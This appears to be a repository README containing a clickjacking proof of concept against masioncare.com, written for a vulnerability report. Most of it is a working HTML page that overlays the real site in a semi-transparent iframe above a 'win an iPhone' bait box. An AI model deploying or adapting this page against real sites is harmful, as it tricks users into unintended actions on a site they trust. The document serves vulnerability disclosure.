# Care
This is POC for m.care, For m. care reliability i have created this repo where they can find Clickjacking Vulnerability codes and other confidential informations.
Here is html code which you can access code that i mentuoned in Vulnerability report.

Code: <!DOCTYPE html>
<html>
  <head>
    <title>Clickjacking PoC - masioncare.com</title>
    <style>
      iframe {
        width: 1000px;
        height: 800px;
        opacity: 0.8;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 2;
      }
      #bait {
        z-index: 1;
        position: absolute;
        top: 100px;
        left: 100px;
        background: red;
        width: 200px;
        height: 100px;
      }
    </style>
  </head>
  <body>
    <h2>Click the red box to win an iPhone!</h2>
    <div id="bait"></div>
    <iframe src="https://masioncare.com"></iframe>
  </body>
</html>


When hosted on a malicious domain, this page loads masioncare.com and overlays it in a way to trick users into interacting with it unknowingly.

